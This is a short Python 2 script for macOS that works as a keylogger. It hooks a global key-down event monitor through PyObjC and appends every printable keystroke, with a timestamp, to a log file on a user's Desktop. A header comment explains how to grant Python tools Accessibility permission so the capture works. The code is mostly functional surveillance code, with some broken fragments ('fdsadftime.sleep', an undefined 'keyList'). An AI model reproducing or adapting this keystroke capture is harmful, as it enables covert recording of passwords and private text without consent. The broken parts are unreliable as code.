#!/usr/bin/python2.6

'''

IMPORTANT

Since System Preferences is stupid, you must add IDLE for this version
back into the allowed security thingy. You know what to do.

For those who don't if this code somehow becomes famous, go to
System Preferences, Security & Privacy, Privacy, Accessibility,
then add basically all of the apps in your Python folder. I added
IDLE, Python Launcher, and Build Applet. Im not sure which are
required since I am lazy, just do it. Also everytime you run it,
IDLE will get unchecked from the pane so you will have to check it
again. Although it might just be me. Who knows.


'''
from Cocoa import *
from Foundation import *
from PyObjCTools import AppHelper
import keycode
import string
import sys
import time
import thread

class AppDelegate(NSObject):
    def applicationDidFinishLaunching_(self, aNotification):
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(NSKeyDownMask, handler)

def handler(event):
    if event.type() == NSKeyDown and keycode.tostring(event.keyCode()) in string.printable:
        print(keycode.tostring(event.keyCode()))
        log = open("/Users/aturley/Desktop/logs.txt", 'a')
        log.write(keycode.tostring(event.keyCode()))
        log.write(' PTO ')
        log.write(time.strftime("%Y %m %d %H %M %S"))
        log.write('\n')
        log.close()

def saveKeys(fileName, delay):
    print("test")
    print(keyList)
    while True:
 #       log.write(keyList)
        fdsadftime.sleep(delay)

def main():
    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    NSApp().setDelegate_(delegate)
    AppHelper.runEventLoop()

'''
try:
    thread.start_new_thread(saveKeys, ("logs", 300))
except:
    print("Error: the thread broke...")
'''

if __name__ == '__main__':
   main()
